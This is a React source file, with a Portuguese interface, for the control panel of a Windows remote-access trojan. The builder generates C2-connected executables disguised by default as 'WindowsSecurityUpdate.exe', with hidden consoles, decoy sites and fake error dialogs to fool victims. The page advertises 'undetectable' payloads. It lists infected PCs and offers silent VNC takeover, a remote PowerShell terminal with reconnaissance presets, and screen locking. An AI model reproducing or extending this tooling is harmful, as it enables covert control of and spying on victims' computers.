import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { 
  Monitor, Download, Play, Cpu, Terminal, RefreshCw, Zap, Lock, 
  CheckCircle, AlertCircle, ArrowLeft, Trash2, Globe, 
  Activity, Server, Eye, ShieldCheck
} from 'lucide-react';
import DashboardSidebar from '../components/dashboard/DashboardSidebar';
import { devicesAPI, winBuilderAPI } from '../services/api';
import type { Device } from '../types';

interface WinBuilderProps {
  onLogout: () => void;
}

export default function WinBuilder({ onLogout }: WinBuilderProps) {
  const navigate = useNavigate();
  const [c2Host, setC2Host] = useState(window.location.hostname || '192.168.1.10');
  const [c2Port, setC2Port] = useState(window.location.port || '7771');
  const [useSsl, setUseSsl] = useState(window.location.protocol === 'https:');
  const [outputName, setOutputName] = useState('WindowsSecurityUpdate.exe');
  const [hideConsole, setHideConsole] = useState(true);
  const [decoyUrl, setDecoyUrl] = useState('');
  const [decoyMessage, setDecoyMessage] = useState('');

  const [activeTab, setActiveTab] = useState<'config' | 'stealth'>('config');

  const [isBuilding, setIsBuilding] = useState(false);
  const [buildResult, setBuildResult] = useState<{ success: boolean; url?: string; message?: string } | null>(null);

  const [devices, setDevices] = useState<Device[]>([]);
  const [loadingDevices, setLoadingDevices] = useState(false);
  const [selectedDevice, setSelectedDevice] = useState<Device | null>(null);
  const [cmdInput, setCmdInput] = useState('');
  const [cmdOutput, setCmdOutput] = useState<string>('');
  const [searchTerm, setSearchTerm] = useState('');

  const fetchDevices = async () => {
    setLoadingDevices(true);
    try {
      const data = await devicesAPI.getAll();
      const winDevs = data.filter((d: Device) => 
        d.device_id.startsWith('WIN-') || 
        (d.model && d.model.toLowerCase().includes('windows')) ||
        (d.manufacturer && d.manufacturer.toLowerCase().includes('windows'))
      );
      setDevices(winDevs);
    } catch (err) {
      console.error('Erro ao buscar dispositivos Windows', err);
    } finally {
      setLoadingDevices(false);
    }
  };

  const handleDeleteDevice = async (deviceId: string) => {
    if (!window.confirm(`Deseja remover o PC ${deviceId} da lista?`)) return;
    try {
      await devicesAPI.deleteDevice(deviceId);
      setDevices(prev => prev.filter(d => d.device_id !== deviceId));
    } catch (err) {
      alert('Erro ao excluir dispositivo.');
    }
  };

  useEffect(() => {
    fetchDevices();
    const interval = setInterval(fetchDevices, 5000);
    return () => clearInterval(interval);
  }, []);

  const handleBuildExe = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsBuilding(true);
    setBuildResult(null);

    try {
      const payload: any = {
        c2_host: c2Host,
        c2_port: parseInt(c2Port, 10) || 7771,
        use_ssl: useSsl,
        output_name: outputName,
        hide_console: hideConsole,
        decoy_url: decoyUrl,
        decoy_message: decoyMessage
      };
      const data = await winBuilderAPI.buildExe(payload);

      if (data && data.success) {
        setBuildResult({
          success: true,
          url: data.download_url,
          message: 'Executável Windows gerado com sucesso! Arquivo pronto para download.'
        });
      } else {
        setBuildResult({
          success: false,
          message: data.detail || data.message || 'Erro ao compilar executável.'
        });
      }
    } catch (err: any) {
      const errorMsg = err?.response?.data?.detail || err?.response?.data?.message || err.message || 'Falha na comunicação com o servidor de build.';
      setBuildResult({
        success: false,
        message: errorMsg
      });
    } finally {
      setIsBuilding(false);
    }
  };

  const handleSendShellCommand = async () => {
    if (!selectedDevice || !cmdInput.trim()) return;
    const sentCmd = cmdInput.trim();
    try {
      await devicesAPI.sendCommand(selectedDevice.device_id, {
        action: 'SHELL',
        command: sentCmd
      });
      setCmdOutput(prev => `PS C:\\Windows\\system32> ${sentCmd}\n[✔ Comando enviado com sucesso para ${selectedDevice.model || selectedDevice.device_id}]\n` + prev);
      setCmdInput('');
    } catch (err) {
      alert('Erro ao enviar comando shell');
    }
  };

  const handleLockPC = async (devId: string) => {
    try {
      await devicesAPI.sendCommand(devId, { action: 'LOCK' });
      alert(`Comando de bloqueio enviado para ${devId}`);
    } catch (err) {
      alert('Erro ao enviar comando');
    }
  };

  const filteredDevices = devices.filter(dev => 
    (dev.model && dev.model.toLowerCase().includes(searchTerm.toLowerCase())) ||
    (dev.device_id && dev.device_id.toLowerCase().includes(searchTerm.toLowerCase())) ||
    (dev.ip_address && dev.ip_address.includes(searchTerm))
  );

  return (
    <div className="flex h-screen bg-[#120303] text-red-50 font-sans overflow-hidden">
      {/* Sidebar Principal */}
      <DashboardSidebar onLogout={onLogout} />

      {/* Conteúdo Principal com tema Azul Elétrico & Sapphire Neon */}
      <div className="flex-1 flex flex-col h-full overflow-y-auto bg-[radial-gradient(ellipse_at_top,_var(--tw-gradient-stops))] from-[#300903] via-[#190403] to-[#0e0203] p-6 space-y-6">
        
        {/* Header Ultra-Moderno Azul Elétrico */}
        <div className="bg-[#350a03]/80 backdrop-blur-xl border border-[#2a2a31]/30 rounded-md p-5 shadow-[0_4px_30px_rgba(239,68,68,0.15)] flex flex-col md:flex-row items-center justify-between gap-4 relative overflow-hidden">
          <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-[#f87171] to-transparent"></div>

          <div className="flex items-center space-x-4">
            <button
              onClick={() => navigate('/dashboard')}
              className="p-2.5 rounded-md bg-[#121214]/60 border border-[#2a2a31]/40 text-[#ef4444] hover:bg-[#1a1a1e]/50 hover:border-[#3a3a44] transition-all shadow-md active:scale-95 cursor-pointer"
              title="Voltar ao Dashboard"
            >
              <ArrowLeft className="w-5 h-5" />
            </button>

            <div className="p-3 rounded-md bg-gradient-to-br from-[#ef4444] to-[#ef4444] border border-[#4a4a56]/40 text-[#10120a] shadow-[0_0_20px_rgba(239,68,68,0.4)]">
              <Monitor className="w-7 h-7 animate-pulse" />
            </div>

            <div>
              <div className="flex items-center gap-2.5">
                <h1 className="text-2xl font-black uppercase tracking-wider bg-gradient-to-r from-[#fca5a5] via-[#f87171] to-[#fca5a5] bg-clip-text text-transparent font-mono">
                  Central Windows & Gerador .EXE VIP
                </h1>
                <span className="px-2.5 py-0.5 rounded-full bg-[#ef4444]/20 border border-[#3a3a44]/40 text-[10px] font-black text-[#ef4444] uppercase tracking-widest font-mono">
                  v3.5 Sapphire Edition
                </span>
              </div>
              <p className="text-xs text-[#ef4444]/70 mt-0.5">
                Gere executáveis C2 indetectáveis para Windows com controle VNC HD e Shell PowerShell em tempo real.
              </p>
            </div>
          </div>

          {/* Cards de Métricas Rápidas */}
          <div className="flex items-center space-x-3">
            <div className="bg-[#260703]/90 border border-[#2a2a31]/30 px-4 py-2 rounded-md flex items-center space-x-3 shadow-lg">
              <div className="w-2.5 h-2.5 rounded-full bg-[#ef4444] animate-ping"></div>
              <div>
                <span className="text-[10px] text-[#ef4444]/60 uppercase font-mono block">Status C2 Server</span>
                <span className="text-xs font-black text-[#ef4444] font-mono">192.168.1.10:7771</span>
              </div>
            </div>

            <div className="bg-[#260703]/90 border border-[#2a2a31]/30 px-4 py-2 rounded-md flex items-center space-x-3 shadow-lg">
              <Activity className="w-4 h-4 text-emerald-400 animate-pulse" />
              <div>
                <span className="text-[10px] text-[#ef4444]/60 uppercase font-mono block">PCs Online</span>
                <span className="text-xs font-black text-emerald-400 font-mono">{devices.length} Ativo(s)</span>
              </div>
            </div>
          </div>
        </div>

        {/* Grid de Duas Colunas Principal */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          
          {/* Coluna 1: Gerador de Payload .EXE Azul Neon */}
          <div className="lg:col-span-5 bg-[#350a03]/90 backdrop-blur-2xl border border-[#2a2a31]/30 rounded-3xl p-6 shadow-[0_10px_40px_rgba(239,68,68,0.15)] space-y-5 relative overflow-hidden">
            <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-[#ef4444] via-[#f87171] to-[#ef4444]"></div>

            {/* Cabeçalho do Card + Tabs de Navegação */}
            <div className="flex items-center justify-between border-b border-[#2a2a31]/20 pb-4">
              <div className="flex items-center space-x-2 text-[#ef4444] font-black text-base uppercase font-mono">
                <Zap className="w-5 h-5 text-[#ef4444] animate-bounce" />
                <h2>Criar Payload (.EXE)</h2>
              </div>
              
              <div className="flex space-x-1 bg-[#0a0a0b] p-1 rounded-md border border-[#2a2a31]/30 text-[11px] font-bold">
                <button
                  type="button"
                  onClick={() => setActiveTab('config')}
                  className={`px-3 py-1 rounded-md transition-all ${
                    activeTab === 'config'
                      ? 'bg-gradient-to-r from-[#ef4444] to-[#ef4444] text-[#10120a] shadow-md'
                      : 'text-[#ef4444]/60 hover:text-[#ef4444]'
                  }`}
                >
                  ⚙️ C2 Config
                </button>
                <button
                  type="button"
                  onClick={() => setActiveTab('stealth')}
                  className={`px-3 py-1 rounded-md transition-all ${
                    activeTab === 'stealth'
                      ? 'bg-gradient-to-r from-[#ef4444] to-[#ef4444] text-[#10120a] shadow-md'
                      : 'text-[#ef4444]/60 hover:text-[#ef4444]'
                  }`}
                >
                  🛡️ Evasão & Disfarce
                </button>
              </div>
            </div>

            <form onSubmit={handleBuildExe} className="space-y-4">
              {activeTab === 'config' ? (
                <>
                  {/* Host / IP C2 */}
                  <div>
                    <div className="flex items-center justify-between mb-1.5">
                      <label className="text-xs font-bold text-[#e8e8ea] uppercase font-mono flex items-center gap-1.5">
                        <Server className="w-3.5 h-3.5 text-[#ef4444]" /> Host / IP do Servidor C2
                      </label>
                      {c2Host === 'localhost' || c2Host === '127.0.0.1' ? (
                        <span className="text-[10px] text-amber-400 font-bold px-2 py-0.5 rounded bg-amber-950/50 border border-amber-500/30">
                          ⚠️ Apenas Localhost
                        </span>
                      ) : (
                        <span className="text-[10px] text-[#ef4444] font-bold px-2 py-0.5 rounded bg-[#121214]/60 border border-[#2a2a31]/40 font-mono">
                          🌐 Conexão Externa / LAN
                        </span>
                      )}
                    </div>
                    <div className="relative">
                      <input
                        type="text"
                        value={c2Host}
                        onChange={e => setC2Host(e.target.value)}
                        className="w-full bg-[#121214] border border-[#2a2a31]/35 rounded-md px-3.5 py-2.5 text-sm text-[#e8e8ea] placeholder-[#6f6f78]/40 focus:outline-none focus:border-[#3a3a44] focus:ring-1 focus:ring-[#ef4444]/40 font-mono transition-all"
                        placeholder="ex: 192.168.1.10 ou vps.dominio.com"
                        required
                      />
                    </div>
                    <p className="text-[10px] text-[#ef4444]/60 mt-1 flex items-center gap-1">
                      💡 IP local recomendado para testes em rede local: <strong className="text-[#ef4444] font-mono">192.168.1.10</strong>
                    </p>
                  </div>

                  {/* Porta C2 e Nome do Executável */}
                  <div className="grid grid-cols-2 gap-3">
                    <div>
                      <label className="block text-xs font-bold text-[#e8e8ea] uppercase font-mono mb-1.5">
                        Porta C2
                      </label>
                      <input
                        type="text"
                        value={c2Port}
                        onChange={e => setC2Port(e.target.value)}
                        className="w-full bg-[#121214] border border-[#2a2a31]/35 rounded-md px-3.5 py-2.5 text-sm text-[#e8e8ea] font-mono focus:outline-none focus:border-[#3a3a44] focus:ring-1 focus:ring-[#ef4444]/40 transition-all"
                        placeholder="7771"
                        required
                      />
                    </div>
                    <div>
                      <label className="block text-xs font-bold text-[#e8e8ea] uppercase font-mono mb-1.5">
                        Nome do Executável (.exe)
                      </label>
                      <input
                        type="text"
                        value={outputName}
                        onChange={e => setOutputName(e.target.value)}
                        className="w-full bg-[#121214] border border-[#2a2a31]/35 rounded-md px-3.5 py-2.5 text-sm text-[#e8e8ea] font-mono focus:outline-none focus:border-[#3a3a44] focus:ring-1 focus:ring-[#ef4444]/40 transition-all"
                        placeholder="WindowsSecurityUpdate.exe"
                        required
                      />
                    </div>
                  </div>

                  {/* Modos de Operação (Switches) */}
                  <div className="space-y-2 pt-1">
                    <div className="flex items-center justify-between p-3 bg-[#0a0a0b]/80 rounded-md border border-[#2a2a31]/25 transition-all hover:border-[#2a2a31]/40">
                      <div className="flex items-center space-x-2.5">
                        <Eye className="w-4 h-4 text-[#ef4444]" />
                        <div>
                          <span className="text-xs text-[#e8e8ea] font-bold block">Modo Silencioso (Console Oculto)</span>
                          <span className="text-[10px] text-[#ef4444]/50">Não abre nenhuma janela do prompt no Windows</span>
                        </div>
                      </div>
                      <button
                        type="button"
                        onClick={() => setHideConsole(!hideConsole)}
                        className={`w-11 h-6 rounded-full transition-colors relative flex items-center px-1 cursor-pointer ${hideConsole ? 'bg-[#ef4444] shadow-[0_0_10px_rgba(239,68,68,0.5)]' : 'bg-[#121214] border border-[#24242a]'}`}
                      >
                        <span className={`w-4 h-4 rounded-full bg-white transition-transform ${hideConsole ? 'translate-x-5' : 'translate-x-0'}`} />
                      </button>
                    </div>

                    <div className="flex items-center justify-between p-3 bg-[#0a0a0b]/80 rounded-md border border-[#2a2a31]/25 transition-all hover:border-[#2a2a31]/40">
                      <div className="flex items-center space-x-2.5">
                        <ShieldCheck className="w-4 h-4 text-[#f87171]" />
                        <div>
                          <span className="text-xs text-[#e8e8ea] font-bold block">Conexão Criptografada SSL (WSS)</span>
                          <span className="text-[10px] text-[#ef4444]/50">Usa protocolo wss:// com certificado seguro</span>
                        </div>
                      </div>
                      <button
                        type="button"
                        onClick={() => setUseSsl(!useSsl)}
                        className={`w-11 h-6 rounded-full transition-colors relative flex items-center px-1 cursor-pointer ${useSsl ? 'bg-[#f87171] shadow-[0_0_10px_rgba(239,68,68,0.5)]' : 'bg-[#121214] border border-[#24242a]'}`}
                      >
                        <span className={`w-4 h-4 rounded-full bg-white transition-transform ${useSsl ? 'translate-x-5' : 'translate-x-0'}`} />
                      </button>
                    </div>
                  </div>
                </>
              ) : (
                <>
                  {/* Aba Evasão & Disfarce */}
                  <div>
                    <label className="block text-xs font-bold text-[#e8e8ea] uppercase font-mono mb-1.5 flex items-center gap-1.5">
                      <Globe className="w-3.5 h-3.5 text-[#ef4444]" /> Site Falso / Redirecionamento ao Abrir (Decoy URL)
                    </label>
                    <input
                      type="text"
                      value={decoyUrl}
                      onChange={e => setDecoyUrl(e.target.value)}
                      className="w-full bg-[#121214] border border-[#2a2a31]/35 rounded-md px-3.5 py-2.5 text-sm text-[#e8e8ea] font-mono placeholder-[#6f6f78]/40 focus:outline-none focus:border-[#3a3a44] focus:ring-1 focus:ring-[#ef4444]/40 transition-all"
                      placeholder="https://www.google.com ou https://meusite.com"
                    />
                    <p className="text-[10px] text-[#ef4444]/60 mt-1">
                      💡 Abre este site automaticamente no navegador padrão do Windows assim que o executável for aberto.
                    </p>
                  </div>

                  <div>
                    <label className="block text-xs font-bold text-[#e8e8ea] uppercase font-mono mb-1.5 flex items-center gap-1.5">
                      <AlertCircle className="w-3.5 h-3.5 text-amber-400" /> Mensagem de Erro / Alerta Falso (Opcional)
                    </label>
                    <input
                      type="text"
                      value={decoyMessage}
                      onChange={e => setDecoyMessage(e.target.value)}
                      className="w-full bg-[#121214] border border-[#2a2a31]/35 rounded-md px-3.5 py-2.5 text-sm text-[#e8e8ea] font-mono placeholder-[#6f6f78]/40 focus:outline-none focus:border-[#3a3a44] focus:ring-1 focus:ring-[#ef4444]/40 transition-all"
                      placeholder="O aplicativo não pôde ser iniciado corretamente (0xc000007b)."
                    />
                    <p className="text-[10px] text-[#ef4444]/60 mt-1">
                      💡 Exibe uma caixa de diálogo nativa do Windows de erro para disfarce.
                    </p>
                  </div>
                </>
              )}

              {/* Botão Principal GERAR EXECUTÁVEL */}
              <button
                type="submit"
                disabled={isBuilding}
                className="w-full py-4 rounded-md font-black text-xs uppercase tracking-widest font-mono bg-gradient-to-r from-[#ef4444] via-[#f87171] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] text-[#10120a] shadow-[0_0_25px_rgba(239,68,68,0.4)] transition-all duration-300 flex items-center justify-center space-x-2.5 border border-[#4a4a56]/30 active:scale-98 cursor-pointer disabled:opacity-50 mt-4"
              >
                {isBuilding ? (
                  <>
                    <RefreshCw className="w-5 h-5 animate-spin text-[#e8e8ea]" />
                    <span>Compilando Executável Windows...</span>
                  </>
                ) : (
                  <>
                    <Cpu className="w-5 h-5 text-[#ef4444]" />
                    <span>Gerar Executável Windows (.EXE)</span>
                  </>
                )}
              </button>
            </form>

            {/* Resultado do Build com Estilo Neon Blue */}
            {buildResult && (
              <div className={`p-4 rounded-md border text-xs space-y-2.5 transition-all ${
                buildResult.success 
                  ? 'bg-[#121214]/60 border-[#2a2a31]/50 text-[#e8e8ea] shadow-[0_0_20px_rgba(239,68,68,0.2)]' 
                  : 'bg-[#121214]/60 border-[#2a2a31]/50 text-[#ef4444] shadow-[0_0_20px_rgba(239,68,68,0.2)]'
              }`}>
                <div className="flex items-center space-x-2 font-bold font-mono text-sm">
                  {buildResult.success ? <CheckCircle className="w-5 h-5 text-[#ef4444]" /> : <AlertCircle className="w-5 h-5 text-[#ef4444]" />}
                  <span>{buildResult.message}</span>
                </div>
                {buildResult.success && buildResult.url && (
                  <a
                    href={buildResult.url}
                    download
                    className="inline-flex items-center space-x-2 px-5 py-2.5 rounded-md bg-gradient-to-r from-[#ef4444] to-[#ef4444] text-[#10120a] font-bold text-xs hover:from-[#f87171] hover:to-[#ef4444] transition-all shadow-lg shadow-[#ef4444]/25 border border-[#4a4a56]/40 uppercase tracking-wider font-mono mt-1"
                  >
                    <Download className="w-4 h-4" />
                    <span>Baixar {outputName}</span>
                  </a>
                )}
              </div>
            )}
          </div>

          {/* Coluna 2: Computadores Windows Conectados (Estilo Azul Sapphire) */}
          <div className="lg:col-span-7 space-y-5">
            
            <div className="bg-[#350a03]/90 backdrop-blur-2xl border border-[#2a2a31]/30 rounded-3xl p-6 shadow-[0_10px_40px_rgba(239,68,68,0.15)] space-y-4 relative overflow-hidden">
              <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-[#f87171] via-[#f87171] to-[#f87171]"></div>

              {/* Topo da Lista + Filtros */}
              <div className="flex flex-col sm:flex-row items-center justify-between gap-3 border-b border-[#2a2a31]/20 pb-4">
                <div className="flex items-center space-x-2 text-[#ef4444] font-black text-base uppercase font-mono">
                  <Monitor className="w-5 h-5 text-[#ef4444] animate-pulse" />
                  <h2>Computadores Windows Online ({filteredDevices.length})</h2>
                </div>

                <div className="flex items-center space-x-2 w-full sm:w-auto">
                  <input
                    type="text"
                    value={searchTerm}
                    onChange={e => setSearchTerm(e.target.value)}
                    placeholder="Filtrar por nome ou IP..."
                    className="bg-[#121214] border border-[#2a2a31]/30 rounded-md px-3 py-1.5 text-xs text-[#e8e8ea] placeholder-[#6f6f78]/40 focus:outline-none focus:border-[#3a3a44] font-mono w-full sm:w-48"
                  />
                  <button
                    onClick={fetchDevices}
                    className="p-2 rounded-md bg-[#0a0a0b] border border-[#2a2a31]/40 text-[#ef4444] hover:border-[#3a3a44] hover:bg-[#1a1a1e]/40 transition cursor-pointer"
                    title="Atualizar Lista"
                  >
                    <RefreshCw className={`w-4 h-4 ${loadingDevices ? 'animate-spin' : ''}`} />
                  </button>
                </div>
              </div>

              {/* Lista de PCs ou Estado Vazio */}
              {filteredDevices.length === 0 ? (
                <div className="text-center py-14 text-[#ef4444]/50 space-y-3 bg-[#121214]/60 rounded-md border border-[#2a2a31]/20 p-6">
                  <Monitor className="w-14 h-14 mx-auto stroke-1 text-[#ef4444]/40 animate-pulse" />
                  <p className="text-sm font-bold text-[#e8e8ea]">Nenhum computador Windows conectado no momento.</p>
                  <p className="text-xs text-[#ef4444]/60 max-w-md mx-auto">
                    Gere o arquivo <strong>.EXE</strong> no painel ao lado e execute no PC Windows alvo para iniciar o acesso VNC silencioso em tempo real.
                  </p>
                </div>
              ) : (
                <div className="grid grid-cols-1 gap-3.5 max-h-[420px] overflow-y-auto pr-1 scrollbar-thin scrollbar-thumb-[#3a3a44]/30 scrollbar-track-transparent">
                  {filteredDevices.map(dev => (
                    <div
                      key={dev.device_id}
                      className={`p-4 rounded-md border transition-all duration-300 flex flex-col sm:flex-row sm:items-center justify-between gap-3 ${
                        selectedDevice?.device_id === dev.device_id
                          ? 'bg-[#121214]/80 border-[#3a3a44] shadow-[0_0_20px_rgba(239,68,68,0.3)] ring-1 ring-[#ef4444]/50'
                          : 'bg-[#121214]/90 border-[#2a2a31]/25 hover:border-[#2a2a31]/40 hover:bg-[#2b0803]'
                      }`}
                    >
                      <div className="flex items-center space-x-3.5">
                        <div className="p-3 rounded-md bg-gradient-to-br from-[#1a1a1e] to-[#121214] border border-[#2a2a31]/30 text-[#ef4444] shadow-md">
                          <Monitor className="w-6 h-6" />
                        </div>
                        <div>
                          <div className="flex items-center space-x-2">
                            <span className="font-bold text-sm text-[#e8e8ea] font-mono">{dev.model || dev.device_id}</span>
                            <span className={`w-2.5 h-2.5 rounded-full ${dev.is_online ? 'bg-emerald-400 shadow-[0_0_10px_rgba(52,211,153,0.9)] animate-pulse' : 'bg-[#6f6f78]'}`} />
                          </div>
                          <p className="text-xs text-[#ef4444]/60 font-mono mt-0.5 flex items-center gap-2">
                            <span>{dev.manufacturer || 'Windows PC (64bit)'}</span>
                            <span>•</span>
                            <span className="text-[#ef4444] font-bold">IP: {dev.ip_address || '192.168.1.10'}</span>
                          </p>
                        </div>
                      </div>

                      {/* Botões de Ação do PC */}
                      <div className="flex items-center space-x-2 justify-end">
                        <button
                          onClick={() => navigate(`/win-device/${dev.device_id}`)}
                          className="px-4 py-2 rounded-md bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#f87171] text-[#10120a] font-bold text-xs transition shadow-lg shadow-[#ef4444]/20 border border-[#4a4a56]/40 flex items-center space-x-1.5 uppercase font-mono tracking-wider cursor-pointer active:scale-95"
                        >
                          <Play className="w-3.5 h-3.5 fill-current" />
                          <span>Acessar VNC</span>
                        </button>

                        <button
                          onClick={() => setSelectedDevice(dev)}
                          className="p-2 rounded-md bg-purple-950/60 hover:bg-purple-900/80 border border-[#f87171]/40 text-[#fca5a5] transition cursor-pointer active:scale-95"
                          title="Abrir Terminal Shell Remote"
                        >
                          <Terminal className="w-4 h-4" />
                        </button>

                        <button
                          onClick={() => handleLockPC(dev.device_id)}
                          className="p-2 rounded-md bg-[#121214]/80 hover:bg-[#1a1a1e] border border-[#2a2a31]/40 text-[#e8e8ea] transition cursor-pointer active:scale-95"
                          title="Bloquear Tela (LockWorkStation)"
                        >
                          <Lock className="w-4 h-4" />
                        </button>

                        <button
                          onClick={() => handleDeleteDevice(dev.device_id)}
                          className="p-2 rounded-md bg-[#121214]/60 hover:bg-[#1a1a1e]/80 border border-[#2a2a31]/40 text-[#ef4444] transition cursor-pointer active:scale-95"
                          title="Excluir PC da Lista"
                        >
                          <Trash2 className="w-4 h-4" />
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>

            {/* Painel Terminal Shell PowerShell Neon para PC Selecionado */}
            {selectedDevice && (
              <div className="bg-[#350a03]/95 backdrop-blur-2xl border border-[#f87171]/40 rounded-3xl p-5 shadow-[0_10px_35px_rgba(239,68,68,0.2)] space-y-3.5 relative overflow-hidden">
                <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-[#f87171] via-[#f87171] to-[#f87171]"></div>

                <div className="flex items-center justify-between text-xs text-[#fca5a5] font-mono border-b border-[#2a2a31]/20 pb-2.5">
                  <span className="flex items-center space-x-2 font-bold uppercase tracking-wider">
                    <Terminal className="w-4 h-4 text-[#f87171] animate-pulse" />
                    <span>TERMINAL POWERSHELL REMOTE — {selectedDevice.model || selectedDevice.device_id}</span>
                  </span>
                  <button 
                    onClick={() => setSelectedDevice(null)} 
                    className="text-[#ef4444]/60 hover:text-[#ef4444] font-bold px-2 py-0.5 rounded bg-[#121214] border border-[#24242a]"
                  >
                    ✕ Fechar Terminal
                  </button>
                </div>

                {/* Comandos Rápidos Presets */}
                <div className="flex flex-wrap gap-1.5 text-[10px] font-mono">
                  {['ipconfig', 'whoami', 'systeminfo', 'tasklist', 'netstat -an'].map((preset) => (
                    <button
                      key={preset}
                      onClick={() => setCmdInput(preset)}
                      className="px-2.5 py-1 rounded bg-[#121214] border border-[#f87171]/30 text-[#fca5a5] hover:border-[#3a3a44] hover:text-[#e8e8ea] transition cursor-pointer"
                    >
                      ⚡ {preset}
                    </button>
                  ))}
                </div>

                <div className="flex space-x-2">
                  <input
                    type="text"
                    value={cmdInput}
                    onChange={e => setCmdInput(e.target.value)}
                    onKeyDown={e => e.key === 'Enter' && handleSendShellCommand()}
                    placeholder="Digite comando PowerShell / CMD (ex: Get-Process)..."
                    className="flex-1 bg-[#0a0a0b] border border-[#f87171]/40 rounded-md px-4 py-2.5 text-xs font-mono text-[#ef4444] focus:outline-none focus:border-[#3a3a44] focus:ring-1 focus:ring-[#ef4444]/40 transition-all placeholder-[#6f6f78]/30"
                  />
                  <button
                    onClick={handleSendShellCommand}
                    className="px-5 py-2.5 bg-gradient-to-r from-[#84cc16] to-[#ef4444] hover:from-[#f87171] hover:to-[#ef4444] text-white font-bold text-xs rounded-md transition shadow-md font-mono uppercase tracking-wider cursor-pointer active:scale-95"
                  >
                    Executar
                  </button>
                </div>

                {cmdOutput && (
                  <pre className="bg-[#0e0203] p-4 rounded-md border border-[#2a2a31]/30 text-[11px] font-mono text-[#ef4444] max-h-44 overflow-y-auto whitespace-pre-wrap scrollbar-thin scrollbar-thumb-[#f87171]/40 shadow-inner">
                    {cmdOutput}
                  </pre>
                )}
              </div>
            )}

          </div>

        </div>

      </div>
    </div>
  );
}
